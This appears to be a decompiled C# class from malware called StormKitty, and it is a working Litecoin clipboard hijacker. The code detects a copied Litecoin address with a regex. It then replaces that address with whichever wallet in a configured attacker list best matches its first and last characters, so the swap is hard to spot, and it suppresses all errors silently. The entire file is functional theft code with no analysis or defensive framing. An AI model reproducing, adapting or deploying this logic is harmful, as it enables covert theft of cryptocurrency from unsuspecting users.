using System;
using System.Collections.Generic;
using System.Linq;
using System.Text.RegularExpressions;
using System.Windows.Forms;

namespace StormKitty
{
	// Token: 0x02000047 RID: 71
	internal class CheckLTC
	{
		// Token: 0x06000128 RID: 296 RVA: 0x00009968 File Offset: 0x00007B68
		public static bool Clipregex(string clipboard)
		{
			string text = clipboard.Trim();
			return text.Length >= 26 && text.Length <= 34 && new Regex(CheckLTC.Key).IsMatch(text);
		}

		// Token: 0x06000129 RID: 297 RVA: 0x000099A8 File Offset: 0x00007BA8
		internal static void SetsLTC(string originalClipboardText)
		{
			try
			{
				string b = originalClipboardText.Trim();
				HashSet<string> hashSet = new HashSet<string>();
				int num = 0;
				foreach (string text in Config.walletsltc.ToList<string>())
				{
					int num2 = CheckLTC.FirstCharFitNum(text, b);
					if (num2 >= num)
					{
						if (num2 == num)
						{
							hashSet.Add(text);
						}
						else if (num2 > num)
						{
							hashSet.Clear();
							num = num2;
							hashSet.Add(text);
							Clipboard.SetText(text);
						}
					}
				}
				int num3 = 0;
				foreach (string text2 in hashSet)
				{
					int num4 = CheckLTC.LastCharFitNum(text2, b);
					if (num4 > num3)
					{
						num3 = num4;
						Clipboard.SetText(text2);
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x0600012A RID: 298 RVA: 0x00009AAC File Offset: 0x00007CAC
		private static int LastCharFitNum(string a, string b)
		{
			int num = 0;
			bool flag = true;
			int num2 = 0;
			while (num2 < Math.Min(a.Length, b.Length) && flag)
			{
				if (a[a.Length - 1 - num2] != b[b.Length - 1 - num2])
				{
					flag = false;
				}
				else
				{
					num++;
				}
				num2++;
			}
			return num;
		}

		// Token: 0x0600012B RID: 299 RVA: 0x00009B08 File Offset: 0x00007D08
		private static int FirstCharFitNum(string a, string b)
		{
			int num = 0;
			bool flag = true;
			int num2 = 0;
			while (num2 < Math.Min(a.Length, b.Length) && flag)
			{
				if (a[num2] != b[num2])
				{
					flag = false;
				}
				else
				{
					num++;
				}
				num2++;
			}
			return num;
		}

		// Token: 0x04000087 RID: 135
		public static string Key = "^(L)[123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz].*$";
	}
}
